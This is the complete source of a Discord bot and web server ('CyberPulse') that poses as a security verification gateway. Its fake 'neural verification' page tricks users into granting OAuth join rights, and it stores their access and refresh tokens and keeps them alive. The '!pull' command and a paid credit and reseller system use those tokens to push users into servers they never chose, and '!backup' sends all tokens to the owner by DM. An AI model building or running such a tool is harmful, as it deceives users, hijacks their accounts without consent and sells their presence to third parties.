const { 
  Client, 
  GatewayIntentBits, 
  EmbedBuilder, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  StringSelectMenuBuilder, 
  StringSelectMenuOptionBuilder,
  PermissionFlagsBits,
  ChannelType,
  SlashCommandBuilder,
  REST,
  Routes,
  AttachmentBuilder
} = require('discord.js');
const express = require('express');
const http = require('http');
const mongoose = require('mongoose');
const axios = require('axios');
require('dotenv').config();

// ==================== CONFIGURATION & ENVIRONMENT ====================
const TOKEN = process.env.DISCORD_TOKEN || process.env.BOT_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const PUBLIC_URL = process.env.PUBLIC_URL || 'https://oauth1-bb1j.onrender.com';
const REDIRECT_URI = process.env.REDIRECT_URI || `${PUBLIC_URL}/callback`;
const MONGO_URI = process.env.MONGO_URI;

const OWNER_ID = '1370594462941581433';
const BANNER_IMAGE_URL = 'https://cdn.discordapp.com/attachments/1531305989410787418/1568198735694139402/Gemini_Generated_Image_xjoeqcxjoeqcxjoe.png?ex=6af19562&is=6af043e2&hm=4298d9d755b0a7b4ffe1b1afa3b14ff15639d997e53a1a0e110589ff341f2da2&';

if (!TOKEN || !CLIENT_ID || !CLIENT_SECRET || !MONGO_URI) {
  console.error("❌ [FATAL ERROR]: Missing critical environment variables in Render settings.");
  process.exit(1);
}

// ==================== DATABASE SCHEMAS ====================
mongoose.connect(MONGO_URI)
  .then(() => console.log("⚡ [DATABASE] Connected to database successfully!"))
  .catch(err => console.error("❌ [DATABASE ERROR]:", err));

const userSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  username: String,
  accessToken: { type: String, required: true },
  refreshToken: { type: String, required: true },
  expiresAt: { type: Date, required: true },
  verifiedAt: { type: Date, default: Date.now }
}, { collection: 'verifiedusers' });
const VerifiedUser = mongoose.model('VerifiedUser', userSchema);

const creditSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  balance: { type: Number, default: 0 },
  onlineAdded: { type: Number, default: 0 },
  offlineAdded: { type: Number, default: 0 },
  reactionAdded: { type: Number, default: 0 },
  onlineConsumed: { type: Number, default: 0 },
  offlineConsumed: { type: Number, default: 0 },
  reactionConsumed: { type: Number, default: 0 }
}, { collection: 'usercredits' });
const UserCredit = mongoose.model('UserCredit', creditSchema);

const resellerSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  addedAt: { type: Date, default: Date.now }
}, { collection: 'resellers' });
const Reseller = mongoose.model('Reseller', resellerSchema);

const partnerSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  addedAt: { type: Date, default: Date.now }
}, { collection: 'partners' });
const Partner = mongoose.model('Partner', partnerSchema);

const guildConfigSchema = new mongoose.Schema({
  guildId: { type: String, required: true, unique: true },
  verifiedRoleId: { type: String, default: null }
}, { collection: 'guildconfigs' });
const GuildConfig = mongoose.model('GuildConfig', guildConfigSchema);

const operationSchema = new mongoose.Schema({
  opId: { type: String, required: true, unique: true },
  discordId: { type: String, required: true },
  targetGuildId: String,
  requestedQuantity: Number,
  successfulQuantity: { type: Number, default: 0 },
  status: { type: String, default: 'PROCESSING' },
  timestamp: { type: Date, default: Date.now }
}, { collection: 'operations' });
const Operation = mongoose.model('Operation', operationSchema);

const activeSessions = new Map();

async function hasOwnerPrivileges(userId) {
  if (userId === OWNER_ID) return true;
  const isPartner = await Partner.findOne({ discordId: userId });
  return !!isPartner;
}

function calculatePrice(quantity) {
  let bonusPercent = 0;
  let tierName = 'Standard Tier 📦';
  if (quantity >= 10000) { bonusPercent = 15; tierName = 'Enterprise Tier 🏢'; }
  else if (quantity >= 2500) { bonusPercent = 5; tierName = 'Pro Tier ⚡'; }
  else if (quantity >= 500) { bonusPercent = 1; tierName = 'Starter Tier 🚀'; }

  const bonusCredits = Math.floor((quantity * bonusPercent) / 100);
  const totalCreditsGiven = quantity + bonusCredits;
  return { quantity, bonusPercent, tierName, bonusCredits, totalCreditsGiven };
}

// ==================== EXPRESS HEALTH SERVER ====================
const app = express();
const server = http.createServer(app);

app.use(express.json());

// Verification Landing Screen & OAuth Route
app.get('/verify', (req, res) => {
  const discordOAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
  
  const loadingScreenHtml = `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>CYBERPULSE // Neural Verification Gateway</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
      * { box-sizing: border-box; margin: 0; padding: 0; }
      body {
        background-color: #04050a;
        background-image: radial-gradient(circle at 50% 30%, rgba(112, 0, 255, 0.2), transparent 70%);
        color: #e2e8f0; font-family: 'Rajdhani', sans-serif;
        height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden;
      }
      .container { width: 100%; max-width: 420px; padding: 20px; text-align: center; }
      .card {
        background: rgba(13, 14, 24, 0.9); border: 1px solid rgba(139, 92, 246, 0.4);
        border-radius: 16px; padding: 40px 30px; backdrop-filter: blur(15px);
        box-shadow: 0 0 50px rgba(112, 0, 255, 0.3);
      }
      .title { font-family: 'Orbitron', sans-serif; font-size: 1.4rem; color: #38bdf8; margin-bottom: 10px; letter-spacing: 2px; }
      .subtitle { font-size: 0.9rem; color: #94a3b8; margin-bottom: 30px; }
      .spinner {
        width: 64px; height: 64px; margin: 0 auto 30px; border: 4px solid rgba(139, 92, 246, 0.2);
        border-top: 4px solid #10b981; border-radius: 50%; animation: spin 1s linear infinite;
      }
      @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
      .status-text { font-family: 'Orbitron', sans-serif; font-size: 0.85rem; color: #a78bfa; margin-bottom: 25px; letter-spacing: 1px; }
      .btn-verify {
        display: none; width: 100%; padding: 14px; font-family: 'Orbitron', sans-serif; font-size: 0.9rem; font-weight: 700;
        color: white; background: linear-gradient(135deg, #7000ff, #38bdf8); border: none; border-radius: 8px;
        cursor: pointer; text-decoration: none; box-shadow: 0 4px 20px rgba(112, 0, 255, 0.4); transition: transform 0.2s;
      }
      .btn-verify:hover { transform: translateY(-2px); }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="card">
        <h1 class="title">CYBERPULSE SECURITY</h1>
        <p class="subtitle">Establishing secure encrypted handshake...</p>
        <div class="spinner" id="spinner"></div>
        <div class="status-text" id="statusText">Scanning Neural Signature...</div>
        <a href="${discordOAuthUrl}" class="btn-verify" id="verifyBtn">AUTHORIZE DISCORD LINK 🔐</a>
      </div>
    </div>
    <script>
      setTimeout(() => {
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('statusText').innerText = 'SECURE HANDSHAKE ESTABLISHED // READY';
        const btn = document.getElementById('verifyBtn');
        btn.style.display = 'block';
        window.location.href = "${discordOAuthUrl}";
      }, 2500);
    </script>
  </body>
  </html>
  `;
  res.send(loadingScreenHtml);
});

// OAuth Callback Route
app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.status(400).send('❌ Authorization failed.');

  try {
    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
      client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'authorization_code', code, redirect_uri: REDIRECT_URI
    }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

    const { access_token, refresh_token, expires_in } = tokenResponse.data;
    const expiresAt = new Date(Date.now() + expires_in * 1000);

    const userResponse = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${access_token}` }
    });

    const discordId = userResponse.data.id;
    const username = userResponse.data.username;

    await VerifiedUser.findOneAndUpdate(
      { discordId },
      { username, accessToken: access_token, refreshToken: refresh_token, expiresAt, verifiedAt: Date.now() },
      { upsert: true, new: true }
    );

    client.guilds.cache.forEach(async (guild) => {
      try {
        const config = await GuildConfig.findOne({ guildId: guild.id });
        if (config && config.verifiedRoleId) {
          const member = await guild.members.fetch(discordId).catch(() => null);
          if (member) await member.roles.add(config.verifiedRoleId).catch(() => {});
        }
      } catch (e) {}
    });

    const successHtml = `
    <!DOCTYPE html>
    <html lang="en">
    <head><title>CYBERPULSE // Verified</title><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Rajdhani:wght@500&display=swap" rel="stylesheet"><style>body{background:#04050a;color:#fff;font-family:'Rajdhani',sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center}.card{background:#0d0e18;border:1px solid #10b981;padding:40px;border-radius:12px;box-shadow:0 0 30px rgba(16,185,129,0.3)}h1{font-family:'Orbitron';color:#10b981;margin-bottom:15px}</style></head>
    <body><div class="card"><h1>ACCESS GRANTED</h1><p>Verification successful. You may close this window and return to Discord.</p></div></body>
    </html>`;
    res.send(successHtml);
  } catch (error) {
    res.status(500).send('❌ Authentication protocol failed.');
  }
});

app.get('/', (req, res) => res.status(200).send('⚡ CYBERPULSE DISCORD BOT SYSTEM ONLINE'));
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`🚀 [WEB SERVER] Running live on port ${PORT}`));

// ==================== DISCORD BOT SETUP ====================
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildPresences]
});

const slashCommands = [
  new SlashCommandBuilder().setName('verifiedrole').setDescription('🛡️ Configure the verified role assigned automatically upon user verification.')
    .addRoleOption(option => option.setName('role').setDescription('Select the verified role').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

client.once('clientReady', async () => {
  console.log(`🤖 [DISCORD BOT] Online and locked in as ${client.user.tag}!`);
  try { await rest.put(Routes.applicationCommands(CLIENT_ID), { body: slashCommands }); } catch (err) {}
});

// Auto-Healer & Pruner (Delayed 10 mins on boot)
setTimeout(() => {
  setInterval(async () => {
    try {
      const users = await VerifiedUser.find({});
      for (const user of users) {
        try {
          await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${user.accessToken}` }, timeout: 3000 });
        } catch (err) {
          try {
            const res = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
              client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'refresh_token', refresh_token: user.refreshToken
            }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
            user.accessToken = res.data.access_token;
            user.refreshToken = res.data.refresh_token;
            user.expiresAt = new Date(Date.now() + res.data.expires_in * 1000);
            await user.save();
          } catch (refreshErr) { await VerifiedUser.deleteOne({ discordId: user.discordId }); }
        }
        await new Promise(r => setTimeout(r, 200));
      }
    } catch (err) {}
  }, 3600000);
}, 600000);

process.on('unhandledRejection', error => {});
process.on('uncaughtException', error => {});

// ==================== DISCORD MESSAGE COMMANDS ====================
client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  const prefix = '!';
  if (!message.content.startsWith(prefix)) return;
  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();
  const isOwner = message.author.id === OWNER_ID;
  const hasPrivileges = await hasOwnerPrivileges(message.author.id);

  try {
    if (command === 'verify') {
      const embed = new EmbedBuilder().setColor(0x7000ff).setTitle('⚡ CyberPulse System Clearance & Verification')
        .setDescription('✨ Click the secure button below to complete OAuth2 authorization, claim your verified role, and unlock full server access.')
        .setImage(BANNER_IMAGE_URL).setFooter({ text: 'CyberPulse Security Protocol 🛡️' });
      const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verify System Clearance').setStyle(ButtonStyle.Link).setURL(`${PUBLIC_URL}/verify`).setEmoji('🔐'));
      return message.reply({ embeds: [embed], components: [row] });
    }

    if (command === 'panel') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied:** Only the bot owner or authorized partners can deploy the master panel.');
      const embed = new EmbedBuilder().setColor(0x7000ff).setTitle('💎 CyberPulse Management & Hub 🚀')
        .setDescription('🛒 **Buy Credits:** Open a private ticket with administration.\n💳 **My Credits:** Check your available balance.\n⚡ **Add Members:** Initialize deployment sequence.')
        .setImage(BANNER_IMAGE_URL);
      
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('btn_buy_credits_ticket').setLabel('Buy Credits').setStyle(ButtonStyle.Success).setEmoji('🛒'),
        new ButtonBuilder().setCustomId('btn_my_credits').setLabel('My Credits').setStyle(ButtonStyle.Secondary).setEmoji('💳'),
        new ButtonBuilder().setCustomId('btn_add_members').setLabel('Add Members').setStyle(ButtonStyle.Primary).setEmoji('⚡'),
        new ButtonBuilder().setLabel('Add Bot').setStyle(ButtonStyle.Link).setURL(`https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot`).setEmoji('🤖')
      );
      return message.reply({ embeds: [embed], components: [row] });
    }

    if (command === 'calculator' || command === 'calc') {
      const amount = parseInt(args[0], 10);
      if (isNaN(amount) || amount <= 0) return message.reply('⚠️ **Usage:** `!calculator <amount>`');
      const calc = calculatePrice(amount);
      const embed = new EmbedBuilder().setColor(0x38bdf8).setTitle('💳 CyberPulse Tiered Credit Calculator 📊').addFields(
        { name: '📦 Target Order Amount', value: `\`${calc.quantity.toLocaleString()} Credits\``, inline: true },
        { name: '🏆 Pricing Tier', value: `\`${calc.tierName}\``, inline: true },
        { name: '🎁 Bulk Bonus %', value: `\`${calc.bonusPercent}%\``, inline: true },
        { name: '🎉 Extra Bonus Credits', value: `\`+${calc.bonusCredits.toLocaleString()} Credits\``, inline: true },
        { name: '🌟 Total Credits Received', value: `\`${calc.totalCreditsGiven.toLocaleString()} Credits\``, inline: true }
      ).setTimestamp();
      return message.reply({ embeds: [embed] });
    }

    if (command === 'topresellers' || command === 'resellerboard') {
      const topResellers = await UserCredit.find({ offlineConsumed: { $gt: 0 } }).sort({ offlineConsumed: -1 }).limit(5);
      if (topResellers.length === 0) return message.reply('📊 No reseller volume tracked yet.');
      let desc = '🏆 **Top CyberPulse Resellers by Sales Volume:**\n\n';
      topResellers.forEach((res, i) => { desc += `${i === 0 ? '👑' : '⭐'} **#${i+1}** <@${res.discordId}> — **${res.offlineConsumed.toLocaleString()}** Credits\n`; });
      return message.reply({ embeds: [new EmbedBuilder().setColor(0x10b981).setTitle('📊 CyberPulse Reseller Leaderboard 🚀').setDescription(desc)] });
    }

    if (command === 'backup') {
      if (!isOwner) return message.reply('❌ Access Denied.');
      const verifiedUsers = await VerifiedUser.find({});
      const userCredits = await UserCredit.find({});
      const buffer = Buffer.from(JSON.stringify({ timestamp: new Date(), verifiedUsers, userCredits }, null, 2));
      const attachment = new AttachmentBuilder(buffer, { name: `CyberPulse_Backup_${Date.now()}.json` });
      return message.author.send({ content: '⚡ **CyberPulse Encrypted Database Backup 📦**', files: [attachment] })
        .then(() => message.reply('✅ Backup sent to your DMs!'))
        .catch(() => message.reply('❌ Failed to DM backup. Check your privacy settings.'));
    }

    if (command === 'gc') {
      if (!hasPrivileges) return message.reply('❌ Access Denied.');
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('❌ Usage: `!gc @user <amount>`');
      const calc = calculatePrice(amount);
      let uc = await UserCredit.findOne({ discordId: targetUser.id }) || new UserCredit({ discordId: targetUser.id, balance: 0 });
      uc.balance += calc.totalCreditsGiven; uc.offlineAdded += calc.totalCreditsGiven;
      await uc.save();
      return message.reply(`📦 Added **${amount}** base credits (+**${calc.bonusCredits}** bonus) to <@${targetUser.id}>!`);
    }

    if (command === 'rc') {
      if (!hasPrivileges) return message.reply('❌ Access Denied.');
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('❌ Usage: `!rc @user <amount>`');
      let uc = await UserCredit.findOne({ discordId: targetUser.id }) || new UserCredit({ discordId: targetUser.id, balance: 0 });
      const deducted = Math.min(uc.balance, amount);
      uc.balance = Math.max(0, uc.balance - amount); uc.offlineConsumed += deducted;
      await uc.save();
      return message.reply(`🔻 Deducted **${amount}** credits from <@${targetUser.id}>.`);
    }

    if (command === 'partner') {
      if (!isOwner) return message.reply('❌ Access Denied.');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ Usage: `!partner @user`');
      await Partner.findOneAndUpdate({ discordId: targetUser.id }, { discordId: targetUser.id }, { upsert: true });
      return message.reply(`🤝 Appointed <@${targetUser.id}> as Partner!`);
    }

    if (command === 'reseller') {
      if (!hasPrivileges) return message.reply('❌ Access Denied.');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ Usage: `!reseller @user`');
      await Reseller.findOneAndUpdate({ discordId: targetUser.id }, { discordId: targetUser.id }, { upsert: true });
      return message.reply(`💼 Registered <@${targetUser.id}> as Reseller!`);
    }

    if (command === 'resale') {
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('⚠️ Usage: `!resale @user <amount>`');
      const isReseller = await Reseller.findOne({ discordId: message.author.id });
      if (!isReseller && !hasPrivileges) return message.reply('❌ Access Denied.');
      let sender = await UserCredit.findOne({ discordId: message.author.id });
      if (!sender || sender.balance < amount) return message.reply('❌ Insufficient balance.');
      sender.balance -= amount; sender.offlineConsumed += amount; await sender.save();
      let recipient = await UserCredit.findOne({ discordId: targetUser.id }) || new UserCredit({ discordId: targetUser.id, balance: 0 });
      recipient.balance += amount; recipient.offlineAdded += amount; await recipient.save();
      return message.reply(`💼 Transferred **${amount}** credits to <@${targetUser.id}>!`);
    }

    if (command === 'irbal' || command === 'rbal') {
      const targetUser = message.mentions.users.first() || message.author;
      let uc = await UserCredit.findOne({ discordId: targetUser.id }) || { balance: 0, offlineAdded: 0, offlineConsumed: 0 };
      const embed = new EmbedBuilder().setColor(0x2b2d31)
        .setAuthor({ name: `Reseller Balance — ${targetUser.username}`, iconURL: 'https://cdn.discordapp.com/emojis/841261569083815946.webp?size=96' })
        .setDescription(`**Status:** ✅ Active\n\n🟢 **Online Members:** 0\n🔘 **Offline Members:** ${uc.balance.toLocaleString()}\n🎉 **Reaction Members:** 0\n\n──────────────────────────────\n\n📈 **Online Added:** 0\n📈 **Offline Added:** ${uc.offlineAdded.toLocaleString()}\n📈 **Reaction Added:** 0\n📉 **Online Consumed:** 0\n📉 **Offline Consumed:** ${uc.offlineConsumed.toLocaleString()}\n📉 **Reaction Consumed:** 0`)
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true }))
        .setFooter({ text: 'CyberPulse • Reseller' }).setTimestamp();
      return message.reply({ embeds: [embed] });
    }

    if (command === 'pull') {
      if (!hasPrivileges) return message.reply('❌ Access Denied.');
      const targetGuildId = args[0];
      if (!targetGuildId) return message.reply('❌ Usage: `!pull <GUILD_ID> [LIMIT]`');
      const pullLimit = args[1] ? parseInt(args[1], 10) : null;
      const statusMsg = await message.reply(`🚀 Synchronizing database tokens into \`${targetGuildId}\`...`);
      try {
        const targetGuild = await client.guilds.fetch(targetGuildId);
        const verifiedUsers = await VerifiedUser.find({});
        let successfulJoins = 0;
        for (const userRecord of verifiedUsers) {
          if (pullLimit && successfulJoins >= pullLimit) break;
          try {
            const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
            if (member) continue;
            await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
            successfulJoins++;
            await new Promise(r => setTimeout(r, 600));
          } catch (err) {}
        }
        return statusMsg.edit(`✅ Successfully pulled **${successfulJoins}** members.`);
      } catch (err) { return statusMsg.edit('❌ Critical error executing manual pull.'); }
    }

    if (command === 'bal' || command === 'balance') {
      const uc = await UserCredit.findOne({ discordId: message.author.id }) || { balance: 0 };
      return message.reply(`💳 **Your Balance:** \`${uc.balance} credits\``);
    }

    if (command === 'stock') {
      const totalStock = await VerifiedUser.countDocuments();
      return message.reply(`📦 **Total Verified Stock:** \`${totalStock} accounts\``);
    }

  } catch (err) {}
});

// Background Dispatch Engine
async function executeDiscordDispatch(opId, userId, guildId, quantity, messageRef) {
  try {
    const targetGuild = await client.guilds.fetch(guildId);
    const verifiedUsers = await VerifiedUser.find({});
    let successful = 0;
    for (const userRecord of verifiedUsers) {
      if (successful >= quantity) break;
      try {
        const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
        if (member) continue;
        await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
        successful++;
        if (successful % 5 === 0) {
          await messageRef.edit(`Adding members ⏳\nProgress: ${successful}/${quantity}\n🆔 Operation: \`${opId}\``).catch(() => {});
        }
        await new Promise(r => setTimeout(r, 600));
      } catch (err) {}
    }
    await Operation.findOneAndUpdate({ opId }, { successfulQuantity: successful, status: 'COMPLETED' });
    await messageRef.edit(`✅ Operation \`${opId}\` Completed! Successfully added **${successful}** members.`);
  } catch (err) {
    await Operation.findOneAndUpdate({ opId }, { status: 'FAILED' });
    await messageRef.edit(`❌ Operation \`${opId}\` failed due to an unexpected error.`);
  }
}

// ==================== DISCORD INTERACTION HANDLING ====================
client.on('interactionCreate', async (interaction) => {
  try {
    if (interaction.isChatInputCommand() && interaction.commandName === 'verifiedrole') {
      const role = interaction.options.getRole('role');
      await GuildConfig.findOneAndUpdate({ guildId: interaction.guild.id }, { verifiedRoleId: role.id }, { upsert: true });
      return interaction.reply({ content: `✅ Verified role set to ${role}!`, ephemeral: true });
    }

    if (interaction.isButton()) {
      if (interaction.customId === 'btn_buy_credits_ticket') {
        const cleanName = interaction.user.username.toLowerCase().replace(/[^a-z0-9]/g, '');
        const channelName = `ticket-${cleanName}`;
        const existing = interaction.guild.channels.cache.find(c => c.name === channelName);
        if (existing) return interaction.reply({ content: `❌ Active ticket exists: ${existing}`, ephemeral: true });

        const channel = await interaction.guild.channels.create({
          name: channelName, type: ChannelType.GuildText,
          permissionOverwrites: [
            { id: interaction.guild.roles.everyone.id, deny: [PermissionFlagsBits.ViewChannel] },
            { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
            { id: OWNER_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }
          ]
        });
        const ticketEmbed = new EmbedBuilder().setColor(0x7000ff).setTitle('🛒 CyberPulse Credit Purchase Ticket ⚡')
          .setDescription(`Welcome <@${interaction.user.id}>!\nState how many credits you wish to purchase.\n\n**📦 Tier Packages:**\n• Starter: 500 Credits\n• Pro (5% Bonus): 2,500 Credits\n• Enterprise (15% Bonus): 10,000 Credits`);
        await channel.send({ content: `<@${interaction.user.id}> | <@${OWNER_ID}>`, embeds: [ticketEmbed] });
        return interaction.reply({ content: `✅ Ticket created: ${channel}`, ephemeral: true });
      }

      if (interaction.customId === 'btn_my_credits') {
        const uc = await UserCredit.findOne({ discordId: interaction.user.id }) || { balance: 0 };
        return interaction.reply({ content: `💳 **Your Balance:** \`${uc.balance}\` credits`, ephemeral: true });
      }

      if (interaction.customId === 'btn_add_members') {
        const modal = new ModalBuilder().setCustomId('modal_server_id').setTitle('CyberPulse Scan 🚀');
        const input = new TextInputBuilder().setCustomId('input_server_id').setLabel('Server ID').setStyle(TextInputStyle.Short).setRequired(true);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        return await interaction.showModal(modal);
      }

      if (interaction.customId === 'btn_confirm_purchase') {
        const session = activeSessions.get(interaction.user.id);
        if (!session) return interaction.reply({ content: '❌ Session expired.', ephemeral: true });
        let uc = await UserCredit.findOne({ discordId: interaction.user.id });
        if (!uc || uc.balance < session.quantity) return interaction.update({ content: `❌ Insufficient credits.`, embeds: [], components: [] });

        uc.balance -= session.quantity; uc.offlineConsumed += session.quantity; await uc.save();
        const opId = `DISCORD-OP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
        await Operation.create({ opId, discordId: interaction.user.id, targetGuildId: session.serverId, requestedQuantity: session.quantity });

        await interaction.update({ content: `Adding members ⏳\nProgress: 0/${session.quantity}\n🆔 Operation: \`${opId}\``, embeds: [], components: [] });
        const messageRef = await interaction.fetchReply();
        executeDiscordDispatch(opId, interaction.user.id, session.serverId, session.quantity, messageRef);
      }
    }

    if (interaction.isModalSubmit()) {
      if (interaction.customId === 'modal_server_id') {
        const serverId = interaction.fields.getTextInputValue('input_server_id');
        try {
          const targetGuild = await client.guilds.fetch(serverId);
          const botMember = await targetGuild.members.fetch(client.user.id);
          if (!botMember.permissions.has(PermissionFlagsBits.ManageRoles)) {
            return interaction.reply({ content: '❌ **Security Pre-Flight Scan Failed:** CyberPulse lacks Manage Roles permission.', ephemeral: true });
          }
          activeSessions.set(interaction.user.id, { serverId, guildName: targetGuild.name, memberCount: targetGuild.memberCount });
          const selectMenu = new StringSelectMenuBuilder().setCustomId('select_token_type').setPlaceholder('Select token type').addOptions(new StringSelectMenuOptionBuilder().setLabel('offline').setValue('offline'));
          return interaction.reply({ content: `✅ Pre-Flight Scan Passed for **${targetGuild.name}**! Select token type:`, components: [new ActionRowBuilder().addComponents(selectMenu)], ephemeral: true });
        } catch (e) { return interaction.reply({ content: '❌ **Pre-Flight Scan Failed:** Bot is not in target server or ID is invalid.', ephemeral: true }); }
      }

      if (interaction.customId === 'modal_quantity') {
        const qty = parseInt(interaction.fields.getTextInputValue('input_quantity'), 10);
        const session = activeSessions.get(interaction.user.id);
        if (!session || isNaN(qty) || qty <= 0) return interaction.reply({ content: '❌ Invalid quantity.', ephemeral: true });
        let uc = await UserCredit.findOne({ discordId: interaction.user.id }) || { balance: 0 };
        if (qty > uc.balance) return interaction.reply({ content: `❌ Insufficient balance (${uc.balance} available).`, ephemeral: true });

        session.quantity = qty;
        const confirmEmbed = new EmbedBuilder().setColor(0x10b981).setTitle('🛡️ CyberPulse Operation Pre-Flight Preview').addFields(
          { name: '🏰 Target Server', value: `${session.guildName}\n\`${session.serverId}\``, inline: true },
          { name: '🔢 Dispatch Count', value: `${qty} Members`, inline: true },
          { name: '💳 Cost', value: `${qty} Credits`, inline: true },
          { name: '⚡ Security Status', value: '`PASSED (Permissions Verified)`', inline: false }
        );
        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('btn_confirm_purchase').setLabel('Confirm & Dispatch').setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId('btn_cancel_purchase').setLabel('Cancel').setStyle(ButtonStyle.Danger)
        );
        return interaction.reply({ embeds: [confirmEmbed], components: [row], ephemeral: true });
      }
    }

    if (interaction.isStringSelectMenu() && interaction.customId === 'select_token_type') {
      const modal = new ModalBuilder().setCustomId('modal_quantity').setTitle('Dispatch Quantity');
      const qtyInput = new TextInputBuilder().setCustomId('input_quantity').setLabel('Quantity').setStyle(TextInputStyle.Short).setRequired(true);
      modal.addComponents(new ActionRowBuilder().addComponents(qtyInput));
      return await interaction.showModal(modal);
    }
  } catch (err) {}
});

client.login(TOKEN);
